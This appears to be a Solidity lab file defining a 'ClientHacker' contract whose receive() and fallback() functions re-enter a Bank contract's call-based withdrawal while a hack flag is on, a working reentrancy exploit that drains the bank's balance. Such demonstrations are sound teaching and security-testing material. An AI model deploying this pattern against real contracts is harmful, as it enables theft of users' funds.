pragma solidity ^0.6.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./Bank.sol";
//import "@openzeppelin/contracts/access/Ownable.sol"; //https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol

contract ClientHacker {

  Bank bank;
  bool public hack;

  constructor(address bank_addr) public payable {
    bank = Bank(bank_addr);
    hack = false;
  }

  function set_hack() public payable {
    if (hack == false) { hack = true; }
    else if (hack == true) { hack = false; }
  }

  function deposit(uint amount) public payable {
    bank.deposit{value: amount}();
  }

  function withdraw_via_transfer(uint amount) public payable {
    bank.withdraw_via_transfer(amount);
  }

  function withdraw_via_send(uint amount) public payable {
    bank.withdraw_via_send(amount);
  }

  function withdraw_via_call(uint amount) public payable {
    bank.withdraw_via_call(amount);
  }

  // Fallback function is called when msg.data is not empty
  receive() external payable {
    if (hack == true && address(bank).balance != 0 ) {
      bank.withdraw_via_call(msg.value);
    }
  }
  // Fallback function is called when msg.data is not empty
  fallback() external payable {
    if (hack == true) {
      bank.withdraw_via_call(msg.value);
    }
  }
}
